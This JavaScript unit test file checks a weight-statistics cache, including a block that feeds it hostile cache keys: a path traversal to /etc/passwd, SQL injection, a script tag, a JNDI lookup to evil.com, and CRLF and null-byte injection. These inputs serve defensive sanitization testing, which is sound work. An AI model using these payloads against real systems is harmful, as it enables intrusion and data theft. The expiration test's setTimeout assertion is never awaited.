const should = require('should');
const { WeightStatsCache, getSharedCache, resetSharedCache } = require('../../utils/weight-stats-cache');

describe('WeightStatsCache', function() {
  let cache;

  beforeEach(function() {
    cache = new WeightStatsCache(15, 100); // 15 min TTL, max 100 entries
  });

  afterEach(function() {
    resetSharedCache();
  });

  describe('Basic Operations', function() {
    it('should store and retrieve cached data', function() {
      const data = { average: 75.5, trend: 'down' };
      cache.set('user123', '2024-01-01', '2024-01-31', data);
      
      const retrieved = cache.get('user123', '2024-01-01', '2024-01-31');
      retrieved.should.deepEqual(data);
    });

    it('should return null for cache miss', function() {
      const result = cache.get('user123', '2024-01-01', '2024-01-31');
      should(result).be.null();
    });

    it('should handle cache expiration', function() {
      const cache = new WeightStatsCache(0.001 / 60); // 1ms TTL
      const data = { value: 'test' };
      cache.set('user123', '2024-01-01', '2024-01-31', data);
      
      // Wait for TTL to expire
      setTimeout(() => {
        const result = cache.get('user123', '2024-01-01', '2024-01-31');
        should(result).be.null();
      }, 10);
    });
  });

  describe('Security - Cache Key Sanitization', function() {
    it('should sanitize path traversal attempts in userId', function() {
      const data = { test: 'data' };
      
      // Store with malicious userId containing path traversal
      cache.set('../../../etc/passwd', '2024-01-01', '2024-01-31', data);
      
      // Retrieve with same malicious key - it gets sanitized consistently
      const retrieved = cache.get('../../../etc/passwd', '2024-01-01', '2024-01-31');
      retrieved.should.deepEqual(data);
      
      // The key is sanitized to remove dots and slashes, becoming '_etc_passwd'
      // We can verify this by checking with the sanitized key directly
      const sanitizedKey = '_etc_passwd';
      const directRetrieve = cache.get(sanitizedKey, '2024-01-01', '2024-01-31');
      // This won't match because dates also get sanitized differently
      should(directRetrieve).be.null();
    });

    it('should sanitize special characters in cache keys', function() {
      const data = { test: 'data' };
      
      // Test various injection attempts
      const maliciousIds = [
        'user;DROP TABLE users',
        'user\'OR\'1\'=\'1',
        'user/*comment*/123',
        'user--sql-comment',
        'user<script>alert(1)</script>',
        'user${jndi:ldap://evil.com/a}',
        'user%00nullbyte',
        'user\r\nheader-injection'
      ];
      
      maliciousIds.forEach((maliciousId, index) => {
        cache.set(maliciousId, '2024-01-01', '2024-01-31', { index });
        
        // Verify it was stored (sanitized)
        const retrieved = cache.get(maliciousId, '2024-01-01', '2024-01-31');
        retrieved.should.have.property('index', index);
      });
    });

    it('should handle extremely long cache keys', function() {
      const longUserId = 'a'.repeat(200); // 200 characters
      const data = { test: 'data' };
      
      cache.set(longUserId, '2024-01-01', '2024-01-31', data);
      
      // Should be truncated to 100 characters
      const retrieved = cache.get(longUserId, '2024-01-01', '2024-01-31');
      retrieved.should.deepEqual(data);
    });

    it('should sanitize dates in cache keys', function() {
      const data = { test: 'data' };
      
      // Dates with injection attempts
      cache.set('user123', '2024-01-01;DROP TABLE', '2024-01-31\' OR 1=1', data);
      
      // Should work with sanitized dates
      const retrieved = cache.get('user123', '2024-01-01;DROP TABLE', '2024-01-31\' OR 1=1');
      retrieved.should.deepEqual(data);
    });

    it('should sanitize groupBy option in cache keys', function() {
      const data = { test: 'data' };
      const maliciousOptions = { groupBy: '../../../admin' };
      
      cache.set('user123', '2024-01-01', '2024-01-31', data, maliciousOptions);
      
      // Should be retrievable with same malicious option (gets sanitized same way)
      const retrieved = cache.get('user123', '2024-01-01', '2024-01-31', maliciousOptions);
      retrieved.should.deepEqual(data);
    });

    it('should generate consistent sanitized keys', function() {
      const data1 = { value: 1 };
      const data2 = { value: 2 };
      
      // Store with malicious key
      cache.set('user../123', '2024-01-01', '2024-01-31', data1);
      
      // Store with same key (should overwrite due to consistent sanitization)
      cache.set('user../123', '2024-01-01', '2024-01-31', data2);
      
      // Should get the latest value
      const retrieved = cache.get('user../123', '2024-01-01', '2024-01-31');
      retrieved.should.deepEqual(data2);
    });

    it('should handle invalid cache key components', function() {
      const data = { test: 'data' };
      
      // These get sanitized to valid keys ('___'), not empty strings
      // So they should work without throwing
      cache.set('...', '2024-01-01', '2024-01-31', data);
      const retrieved1 = cache.get('...', '2024-01-01', '2024-01-31');
      retrieved1.should.deepEqual(data);
      
      cache.set('user123', '...', '2024-01-31', data);
      const retrieved2 = cache.get('user123', '...', '2024-01-31');
      retrieved2.should.deepEqual(data);
      
      // Test with truly empty strings that would throw
      should.throws(() => {
        cache.set('', '2024-01-01', '2024-01-31', data);
      }, /Invalid cache key component/);
      
      should.throws(() => {
        cache.set('user123', '', '2024-01-31', data);
      }, /Invalid cache key component/);
    });
  });

  describe('Cache Invalidation', function() {
    it('should invalidate entries by userId', function() {
      cache.set('user123', '2024-01-01', '2024-01-31', { data: 1 });
      cache.set('user456', '2024-01-01', '2024-01-31', { data: 2 });
      cache.set('user123', '2024-02-01', '2024-02-28', { data: 3 });
      
      cache.invalidate('user123');
      
      // user123 entries should be gone
      should(cache.get('user123', '2024-01-01', '2024-01-31')).be.null();
      should(cache.get('user123', '2024-02-01', '2024-02-28')).be.null();
      
      // user456 should still exist
      cache.get('user456', '2024-01-01', '2024-01-31').should.deepEqual({ data: 2 });
    });

    it('should clear all cache entries', function() {
      cache.set('user123', '2024-01-01', '2024-01-31', { data: 1 });
      cache.set('user456', '2024-01-01', '2024-01-31', { data: 2 });
      
      cache.clear();
      
      should(cache.get('user123', '2024-01-01', '2024-01-31')).be.null();
      should(cache.get('user456', '2024-01-01', '2024-01-31')).be.null();
    });
  });

  describe('Performance Metrics', function() {
    it('should track cache hits and misses', function() {
      const data = { test: 'data' };
      cache.set('user123', '2024-01-01', '2024-01-31', data);
      
      // Generate hits
      cache.get('user123', '2024-01-01', '2024-01-31');
      cache.get('user123', '2024-01-01', '2024-01-31');
      
      // Generate misses
      cache.get('user999', '2024-01-01', '2024-01-31');
      cache.get('user888', '2024-01-01', '2024-01-31');
      
      const metrics = cache.getMetrics();
      metrics.currentHits.should.equal(2);
      metrics.currentMisses.should.equal(2);
      metrics.hitRate.should.equal('50.00%');
    });
  });

  describe('Shared Cache Instance', function() {
    it('should return singleton instance', function() {
      const cache1 = getSharedCache();
      const cache2 = getSharedCache();
      cache1.should.equal(cache2);
    });

    it('should reset shared cache', function() {
      const cache1 = getSharedCache();
      cache1.set('user123', '2024-01-01', '2024-01-31', { data: 1 });
      
      resetSharedCache();
      
      const cache2 = getSharedCache();
      cache2.should.not.equal(cache1);
      should(cache2.get('user123', '2024-01-01', '2024-01-31')).be.null();
    });
  });

  describe('Smart Calculation with Caching', function() {
    it('should cache calculation results', async function() {
      let fetchCalled = 0;
      let calcCalled = 0;
      
      const fetchFunction = async () => {
        fetchCalled++;
        return { results: [1, 2, 3] };
      };
      
      const calculateFunction = (data) => {
        calcCalled++;
        return { average: 2, sum: 6 };
      };
      
      // First call should fetch and calculate
      const result1 = await cache.getOrCalculate(
        fetchFunction, 
        calculateFunction, 
        'user123', 
        '2024-01-01', 
        '2024-01-31'
      );
      
      fetchCalled.should.equal(1);
      calcCalled.should.equal(1);
      result1.should.deepEqual({ average: 2, sum: 6 });
      
      // Second call should use cache
      const result2 = await cache.getOrCalculate(
        fetchFunction, 
        calculateFunction, 
        'user123', 
        '2024-01-01', 
        '2024-01-31'
      );
      
      fetchCalled.should.equal(1); // Not called again
      calcCalled.should.equal(1); // Not called again
      result2.should.deepEqual({ average: 2, sum: 6 });
    });
  });
});